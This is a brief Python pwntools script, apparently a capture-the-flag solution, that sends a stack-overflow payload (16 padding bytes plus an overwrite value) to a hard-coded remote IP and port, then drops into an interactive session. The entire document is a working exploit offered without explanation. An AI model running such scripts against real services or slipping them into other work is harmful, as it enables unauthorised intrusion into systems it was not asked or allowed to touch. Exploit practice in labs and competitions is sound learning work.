from pwn import *

payload = "A"*16+"\x05\x03\x02\x01"

p = remote('52.163.126.205', 33331)

print(p.recv())
p.sendline(payload)
p.interactive()
